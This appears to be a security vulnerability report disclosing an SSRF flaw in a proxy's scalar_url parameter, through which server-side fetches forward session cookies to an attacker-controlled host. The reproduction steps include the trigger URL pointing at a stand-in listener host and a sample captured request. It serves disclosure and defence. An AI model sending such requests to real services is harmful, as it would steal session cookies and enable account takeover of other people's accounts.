1. Vulnerability: Server-Side Request Forgery (SSRF) → 0-Click Account Takeover (ATO)

Parameter: scalar_url
Severity: Critical

Description:

The scalar_url parameter allows the server to fetch arbitrary attacker-controlled URLs. The
internal fetcher forwards cookies and other sensitive headers when requesting the attacker
URL. An attacker-controlled listener captured active session cookies from the internal server,
enabling a zero-click account takeover if those cookies represent valid sessions.
Steps to Reproduce (high-level, authorised test only):

● Host a listener URL that logs incoming requests, e.g. http://attacker-
listener.example.com/.

Trigger the proxy to fetch your listener by visiting or issuing a request to:

# https://proxy.scalar.com/?&scalar_url=http://attacker-listener.example.com/

● Observe the request arriving at your listener. Example of an observed request:

GET / HTTP/1.1
Host: attacker-listener.example.com
...
Cookie: _li_dcdm_c=[REDACTED];
        _lc2_fpi=[REDACTED];
        _lc2_fpi_js=[REDACTED];
        _li_ss=[REDACTED];
        scalar-team-uid=[REDACTED];
        vector_visitor_id=[REDACTED]
X-Forwarded-For: [CLIENT-IP], [INTERNAL-IP]
Forwarded: for="[CLIENT-IP]";proto=https


● Confirm whether captured cookies/tokens are active (ONLY in an authorised test
environment). If active, attempt to use them in a safe, approved test account to validate
attacker access (do not test against production or without permission).

Proof / Evidence

Internal server [INTERNAL-IP] contacted the attacker listener and forwarded session cookies
(for example scalar-team-uid), proving the proxy includes sensitive headers/cookies in
server-side fetches.
